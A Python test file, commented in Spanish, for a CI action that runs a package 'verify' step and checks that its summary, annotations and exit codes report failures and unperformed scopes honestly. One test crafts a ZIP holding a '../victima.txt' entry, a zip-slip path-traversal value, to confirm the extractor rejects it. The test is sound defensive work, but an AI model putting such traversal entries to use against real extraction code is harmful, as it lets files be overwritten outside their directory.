    assert codigo == SALIDAS["error_de_uso"]
    assert informe.is_file(), "un retorno temprano no dejó informe que subir"
    datos = json.loads(informe.read_text(encoding="utf-8"))
    assert datos["matrixai_verify_action"]["verify_ran"] is False
    assert "stages" not in datos, (
        "el registro de la acción se disfraza de informe de `verify`")
    texto_resumen = resumen.read_text(encoding="utf-8")
    assert "NOT VERIFIED" in texto_resumen
    assert f"0 of {len(ALCANCES)} scopes" in texto_resumen
    escrito = salidas.read_text(encoding="utf-8")
    assert "verdict=NOT VERIFIED" in escrito
    assert f"exit-code={SALIDAS['error_de_uso']}" in escrito
    assert "unperformed-scopes=" + ",".join(ALCANCES) in escrito


# ---------------------------------------------------------------------------
# El resumen y las anotaciones dicen lo que pasó
# ---------------------------------------------------------------------------

def test_un_FAIL_no_se_titula_VERIFIED():
    assert decidir(_informe(R1="FAIL"), SALIDAS["fallo"]).titulo == "FAILED"


def test_un_FAIL_se_anota_como_ERROR_no_como_AVISO():
    """Un `::notice` o un `::warning` sobre un alcance FALLIDO se lee como
    un detalle; la página del trabajo los pinta distinto a propósito."""
    marcas = anotaciones(decidir(_informe(R1="FAIL"), SALIDAS["fallo"]))
    de_r1 = [m for m in marcas if "R1" in m]
    assert de_r1, marcas
    assert all(m.startswith("::error") for m in de_r1), de_r1


def test_un_NO_REALIZADO_EXIGIDO_se_anota_como_ERROR():
    """El no exigido va con `::warning` —el trabajo sigue verde— y el
    exigido con `::error`. Si los dos fueran aviso, un alcance que tumba el
    trabajo saldría pintado como un detalle."""
    v = decidir(_informe(R1="NOT_RUN", training="NOT_RUN"), SALIDAS["ok"],
                requeridos=("manifest", "R1"))
    marcas = anotaciones(v)
    assert any(m.startswith("::error") and "R1" in m for m in marcas), marcas
    assert any(m.startswith("::warning") and "training" in m for m in marcas), marcas


def test_la_TABLA_no_pone_yes_en_Performed_si_no_se_realizo():
    v = decidir(_informe(R3="INCOMPARABLE"), SALIDAS["ok"])
    filas = [l for l in _resumen(v).splitlines() if l.startswith("| `R3`")]
    assert len(filas) == 1, filas
    assert "**NO**" in filas[0], f"la tabla da R3 por realizado: {filas[0]}"
    assert "| yes |" not in filas[0].split("`INCOMPARABLE`")[1], filas[0]


def test_el_RECUENTO_de_alcances_realizados_NO_MIENTE():
    v = decidir(_informe(training="NOT_RUN", R3="INCOMPARABLE"), SALIDAS["ok"])
    assert "**2 of 4 scopes were actually checked.**" in _resumen(v), _resumen(v)


def test_el_MOTIVO_LITERAL_viaja_DOS_VECES_en_la_tabla_Y_en_la_lista():
    """Los no realizados salen dos veces A PROPÓSITO: en la tabla, donde se
    leen junto a los demás, y en una lista aparte con su motivo, que es lo
    que hay que leer cuando el trabajo sale verde.

    Contentarse con «el motivo aparece en algún sitio» deja que desaparezca
    la sección entera —o la columna— sin que nadie se entere.
    """
    v = decidir(_informe(training="NOT_RUN"), SALIDAS["ok"],
                requeridos=("manifest", "R1"))
    texto = _resumen(v)
    assert texto.count("motivo de training") == 2, (
        f"el motivo literal viaja {texto.count('motivo de training')} vez/veces, "
        f"y tiene que ir en la tabla Y en la lista")
    assert "### Scopes NOT performed" in texto, "desapareció la lista aparte"
    lista = texto.split("### Scopes NOT performed", 1)[1]
    assert "motivo de training" in lista.split("###")[0]


def test_una_ETAPA_QUE_LA_ACCION_NO_CONOCE_no_desaparece_del_resumen():
    """Un dibujo afirma por omisión. Si `verify` crece una quinta etapa, la
    acción la tiraba y el recuento seguía diciendo «4 of 4»: exactamente
    «no se midió» leído como «no había nada que mirar»."""
    informe = _informe()
    informe["stages"]["nueva"] = {"status": "FAIL", "reason": "motivo de nueva"}
    v = decidir(informe, SALIDAS["fallo"])
    assert "nueva" in [a.nombre for a in v.alcances]
    texto = _resumen(v)
    assert "nueva" in texto, "la etapa desconocida desapareció del resumen"
    assert "motivo de nueva" in texto
    assert "of 5 scopes" in texto, f"el recuento sigue contando cuatro: {texto[:200]}"
    assert v.codigo == SALIDAS["fallo"], "un FAIL desconocido no puso el trabajo rojo"


# ---------------------------------------------------------------------------
# `matrixai-engines`: solo si alguien lo pide, y se dice quién
# ---------------------------------------------------------------------------

def _instalador():
    pedidos: list[str] = []

    def instalar(requisito: str) -> tuple[bool, str]:
        pedidos.append(requisito)
        return True, "ok"

    return pedidos, instalar


def test_engines_AUTO_no_instala_nada_si_el_paquete_no_lo_pide(tmp_path):
    """Instalarlo siempre haría que un paquete que declara no necesitarlo se
    verificara igual, tapando justo el fallo que `verify` existe para
    encontrar."""
    pedidos, instalar = _instalador()
    main(["--package", str(_paquete(tmp_path, requirements__txt="numpy\nonnxruntime\n"))],
         ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
         instalar=instalar)
    assert pedidos == [], f"se instaló sin que el paquete lo pidiera: {pedidos}"


def test_engines_AUTO_si_lo_instala_cuando_el_paquete_LO_PIDE(tmp_path):
    """La otra mitad: si nunca se detectara como pedido, la de arriba pasaría
    igual y el paquete que SÍ lo necesita se verificaría sin sus motores."""
    pedidos, instalar = _instalador()
    main(["--package", str(_paquete(
            tmp_path, requirements__txt="numpy\nmatrixai_engines>=0.1\n"))],
         ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
         instalar=instalar)
    assert pedidos == ["matrixai-engines"], pedidos


def test_engines_se_detecta_tambien_en_dependencias_json(tmp_path):
    """El paquete de estudio (106-C1) lo declara ahí, no en `requirements.txt`."""
    pedidos, instalar = _instalador()
    main(["--package", str(_paquete(tmp_path, dependencias__json=json.dumps(
            {"engine": "x", "dependencias": ["MatrixAI.Engines", "numpy"]})))],
         ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
         instalar=instalar)
    assert pedidos == ["matrixai-engines"], pedidos


def test_un_pip_install_FALLIDO_de_engines_PARA_la_accion(tmp_path, capsys):
    """El paquete dijo que lo necesita. Seguir como si nada verificaría un
    paquete al que le faltan sus motores y llamarlo verde."""
    def instalar(requisito):
        return False, "ERROR: could not find a version"

    codigo = main(["--package", str(_paquete(
                        tmp_path, requirements__txt="matrixai-engines\n"))],
                  ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
                  instalar=instalar)
    assert codigo == SALIDAS["error_de_uso"], "un pip fallido se ignoró"
    assert "could not be installed" in capsys.readouterr().out


def test_engines_CON_UNA_CADENA_EXPLICITA_instala_esa(tmp_path):
    """Estaba documentado en `action.yml` («or an explicit requirement
    string») y NO HACÍA NADA: solo se miraba dentro del `elif
    engines.pedido`, así que sobre un paquete que no lo declara no
    instalaba nada y nadie lo decía."""
    pedidos, instalar = _instalador()
    main(["--package", str(_paquete(tmp_path, requirements__txt="numpy\n")),
          "--engines", "matrixai-engines==0.3"],
         ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
         instalar=instalar)
    assert pedidos == ["matrixai-engines==0.3"], (
        f"la cadena explícita no instaló nada: {pedidos}")


def test_engines_SKIP_no_instala_nada_aunque_el_paquete_lo_pida(tmp_path):
    pedidos, instalar = _instalador()
    main(["--package", str(_paquete(tmp_path, requirements__txt="matrixai-engines\n")),
          "--engines", "skip"],
         ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
         instalar=instalar)
    assert pedidos == []


def test_el_resumen_DECLARA_LO_QUE_PASO_con_engines(tmp_path):
    """No lo que se pidió: con una cadena explícita sobre un paquete que no
    lo declara, el resumen decía «not requested… **not** installed» mientras
    la instalación sí había ocurrido."""
    from matrixai.ci.verify_action import PeticionDeEngines as P
    v = decidir(_informe(), SALIDAS["ok"])
    texto = resumen_markdown(v, paquete="p", orden=("x",),
                             engines=P(pedido=False, mirado_en=("requirements.txt",)),
                             engines_instalado="matrixai-engines==0.3",
                             modo_engines="matrixai-engines==0.3")
    assert "**Installed**" in texto, texto.split("### matrixai-engines")[1]
    assert "not** installed" not in texto.split("### matrixai-engines")[1]


def test_un_ZIP_QUE_ESCRIBE_FUERA_se_rechaza_entero(tmp_path):
    """La sonda de engines descomprime un ZIP que viene de fuera. Un
    `extractall` crudo escribe donde el archivo mande —el zip-slip de
    siempre—, y aquí se reusa la guarda del core en vez de repetirla."""
    victima = tmp_path / "victima.txt"
    archivo = tmp_path / "malo.zip"
    with zipfile.ZipFile(archivo, "w") as z:
        z.writestr("pkg/requirements.txt", "matrixai-engines\n")
        z.writestr("../victima.txt", "escapado")
    resultado = peticion_de_engines_de_la_ruta(archivo)
    assert not victima.exists(), "el ZIP escribió FUERA de su directorio (zip-slip)"
    assert resultado.pedido is False
    assert resultado.problema, "se rechazó el archivo sin decir por qué"


def test_un_ZIP_NORMAL_si_se_mira(tmp_path):
    """La otra mitad: si ningún ZIP se abriera, la de arriba pasaría igual."""
    archivo = tmp_path / "bueno.zip"
    with zipfile.ZipFile(archivo, "w") as z:
        z.writestr("pkg/requirements.txt", "matrixai-engines\n")
    resultado = peticion_de_engines_de_la_ruta(archivo)
    assert resultado.pedido is True, resultado
    assert resultado.declarado_en == "requirements.txt"


# ---------------------------------------------------------------------------
# Los bordes de las entradas, que son por donde se afloja sin querer
# ---------------------------------------------------------------------------

def test_engines_VACIO_falla_cerrado(tmp_path, capsys):
    """Como `--retrain`: un valor que no se entiende no se adivina. Una
    cadena vacía llega sola en cuanto alguien escribe
    `engines: ${{ env.ALGO }}` y `ALGO` no está puesto."""
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--engines", "  "],
                  ejecutar=verify)
    assert codigo == SALIDAS["error_de_uso"]
    assert verify.orden is None
    assert "auto" in capsys.readouterr().out


def test_require_VACIO_cae_en_el_defecto_declarado(tmp_path):
    """Aquí sí se cae al defecto —y NO es fallar abierto: el defecto es el
    APRETADO (`manifest,R1`), no «no exijas nada»."""
    verify = _VerifyDeMentira(json.dumps(_informe(manifest="NOT_RUN")), SALIDAS["ok"])
    assert main(["--package", str(_paquete(tmp_path)), "--require", "  "],
                ejecutar=verify) == SALIDAS["sin_realizar"]


def test_require_no_deja_MEZCLAR_all_con_nombres(tmp_path, capsys):
    """`all,manifest` no quiere decir nada: o son todos o son los que se
    listan, y adivinar cuál de los dos es exactamente cómo se afloja."""
    verify = _VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"])
    codigo = main(["--package", str(_paquete(tmp_path)), "--require", "all,manifest"],
                  ejecutar=verify)
    assert codigo == SALIDAS["error_de_uso"]
    assert "cannot be combined" in capsys.readouterr().out


@pytest.mark.parametrize("stdout", ["", "\n", "   \n  \n"])
def test_un_verify_QUE_NO_ESCRIBE_NADA_no_sale_verde(tmp_path, stdout):
    """Un `verify` que se muere sin escribir en stdout deja el informe
    vacío. El artefacto no puede quedar vacío ni el trabajo verde.

    Con un solo caso (`""`) esta prueba NO tenía dientes: cambiar
    `salida if salida.strip() else …` por `salida or …` la dejaba pasando,
    y un `verify` que solo escupe un salto de línea subía un artefacto con
    ese salto de línea en vez del registro que dice qué pasó. MEDIDO
    saboteándolo el 2026-09-15 — salió VERDE cuando se esperaba rojo.
    """
    destino = tmp_path / "informe.json"
    codigo = main(["--package", str(_paquete(tmp_path)), "--report", str(destino)],
                  ejecutar=lambda orden: (1, stdout, "Traceback: boom"))
    assert codigo == SALIDAS["error_de_uso"]
    datos = json.loads(destino.read_text(encoding="utf-8"))["matrixai_verify_action"]
    assert datos["outcome"] == "verify-wrote-nothing"
    assert "boom" in datos["verify_stderr"], "se perdió el porqué"


def test_un_informe_que_es_una_LISTA_no_es_un_informe(tmp_path):
    """`json.loads` lo lee sin quejarse y `informe.get("stages")` reventaría
    o —peor— daría cuatro `MISSING` con pinta de informe."""
    codigo = main(["--package", str(_paquete(tmp_path))],
                  ejecutar=_VerifyDeMentira(json.dumps([{"status": "PASS"}]),
                                            SALIDAS["ok"]))
    assert codigo == SALIDAS["error_de_uso"]


def test_una_cadena_EXPLICITA_de_engines_que_no_instala_para_la_accion(tmp_path, capsys):
    """Y el motivo dice de quién fue la petición: del flujo, no del paquete."""
    codigo = main(["--package", str(_paquete(tmp_path, requirements__txt="numpy\n")),
                   "--engines", "matrixai-engines==0.3"],
                  ejecutar=_VerifyDeMentira(json.dumps(_informe()), SALIDAS["ok"]),
                  instalar=lambda r: (False, "ERROR: no such version"))
    assert codigo == SALIDAS["error_de_uso"]
    salida = capsys.readouterr().out
    assert "the workflow asked for" in salida, salida


def test_el_resumen_no_dice_NOT_REQUESTED_de_un_paquete_que_SI_lo_pide():
    """Los dos casos en los que el paquete lo pide y no está instalado: con
    `skip` (decisión del flujo) y sin instalar (que no debería pasar, pero
    si pasa no puede leerse como «el paquete no lo necesitaba»)."""
    from matrixai.ci.verify_action import PeticionDeEngines as P
    v = decidir(_informe(), SALIDAS["ok"])
    pide = P(pedido=True, mirado_en=("requirements.txt",),
             declarado_en="requirements.txt")

    saltado = resumen_markdown(v, paquete="p", orden=("x",), engines=pide,
                               modo_engines="skip").split("### matrixai-engines")[1]
    assert "skip" in saltado and "DOES ask for it" in saltado, saltado

    sin_poner = resumen_markdown(v, paquete="p", orden=("x",), engines=pide,
                                 modo_engines="auto").split("### matrixai-engines")[1]
    assert "although the package asks for it" in sin_poner, sin_poner
    assert "not requested" not in sin_poner.lower(), sin_poner


def test_el_resumen_DICE_que_no_pudo_mirar_si_el_zip_no_se_abre(tmp_path):
    """Un «no lo pide» sin decir dónde se ha mirado no se puede auditar, y
    un archivo que no se abre no es un paquete que no lo necesite."""
    from matrixai.ci.verify_action import PeticionDeEngines as P
    v = decidir(_informe(), SALIDAS["ok"])
    texto = resumen_markdown(v, paquete="p", orden=("x",),
                             engines=P(pedido=False, problema="the archive is broken"),
                             modo_engines="auto").split("### matrixai-engines")[1]
    assert "could not be determined" in texto and "broken" in texto, texto
